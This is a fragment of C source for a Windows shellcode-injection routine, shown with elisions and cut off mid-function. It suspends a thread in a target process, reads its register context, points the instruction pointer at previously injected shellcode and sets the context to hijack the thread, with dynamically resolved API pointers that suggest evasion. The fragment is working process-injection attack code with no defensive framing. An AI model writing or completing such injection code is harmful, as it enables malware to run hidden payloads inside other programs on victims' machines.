...
BOOL InjectShellcode(DWORD TargetProcess_PID, DWORD TargetProcess_ThreadID) { 
  ...
  SuspendThread(Target_Process_Thread_Handle);


  CONTEXT ctx;
  ctx.ContextFlags = CONTEXT_FULL; 
  if(!GetThreadContext_Addr(Target_Process_Thread_Handle, &ctx)){
    printf ("GetThreadContext ERROR : %u\n",GetLastError());
    return FALSE;
  }
  DWORD_PTR Rip = ctx.Rip; 
  printf ("[+] getting Rip of the target Thread : 0x%08x\n",ctx.Rip);
    
    

  ctx.Rip = (DWORD_PTR)lpBaseAddr;
  printf("[+] Hijacking target thread : new Rip --> 0x%08x\n",ctx.Rip);   


  if(!SetThreadContext_Addr(Target_Process_Thread_Handle, &ctx)){
    printf("Unable to hijack target thread : ERROR (%d)\n",GetLastError());
    ResumeThread_Addr(Target_Process_Thread_Handle);
    VirtualFreeEx_Addr(Target_Process_Handle, lpBaseAddr, 0, MEM_DECOMMIT); // free the allocated memory area
